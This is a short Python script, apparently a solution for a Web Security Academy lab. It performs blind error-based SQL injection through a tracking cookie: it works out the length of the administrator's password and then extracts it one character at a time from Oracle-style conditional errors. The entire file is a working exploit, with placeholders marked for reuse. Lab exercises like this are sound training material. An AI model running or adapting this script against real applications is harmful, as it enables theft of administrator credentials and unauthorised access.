import requests
url='https://0ada0011040a5d6c80791cd40080003a.web-security-academy.net/filter?category=Lifestyle'  #change accordingly
char='abcdefghijklmnopqrstuvwxyz1234567890'
def find_pass(re):
    temp=''
    for i in range(1,re+1):
        for j in char:
            cokkie={'TrackingId':'7maFF2hC52bxt0DG','session':'Zvk6AbtQmkpFWn7geUnmaoCRpA4ecpo7'}        #change accordingly
            payload=f"'||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),{i},1)='{j}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'"
            cokkie['TrackingId'] = cokkie['TrackingId'] + payload
            r = requests.get(url, cookies=cokkie)
            if  r.status_code==500:
                print('\r'+temp)
                temp+=j
                break
    print("Done this is your password:",temp)

def count_le():
    for i in range(1,101):
        cokkie={'TrackingId':'7maFF2hC52bxt0DG','session':'Zvk6AbtQmkpFWn7geUnmaoCRpA4ecpo7'}         #change accordingly
        payload=f"'||(SELECT CASE WHEN (length((select password from users where username='administrator'))={i}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'"
        cokkie['TrackingId']=cokkie['TrackingId']+payload
        r=requests.get(url,cookies=cokkie)
        if  r.status_code==500:
            return i


re=count_le()
print(re)
print("please wait findind password!")
find_pass(re)
